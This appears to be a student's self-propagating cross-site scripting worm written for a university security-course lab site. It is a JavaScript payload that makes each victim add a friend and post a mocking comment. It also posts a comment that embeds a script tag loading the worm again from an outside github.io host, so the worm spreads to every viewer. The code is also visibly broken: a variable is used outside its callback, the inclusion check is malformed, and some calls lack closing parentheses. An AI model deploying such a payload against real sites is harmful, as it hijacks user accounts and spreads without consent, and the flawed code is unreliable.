<script>

var dt = new Date();
var time = dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds();
          
$.get('http://csec380-core.csec.rit.edu:86/timeline.php', 
function(response) { 
    var dump = response.dump;
});

if (dump.includes(!("J05hbrown.github.io/worm/worm.js"))) {

$.get("http://csec380-core.csec.rit.edu:86/addfriend.php", { id: '177' } );

$.get( "http://csec380-core.csec.rit.edu:86/add_comment.php", { comment: 'Oh no! My page has been bamboozled on' + time, id: '177' };

$.get( "http://csec380-core.csec.rit.edu:86/add_comment.php", { comment: "<script src=https://J05hBr0wn.github.io/worm/worm.js></script>" };
}

</script>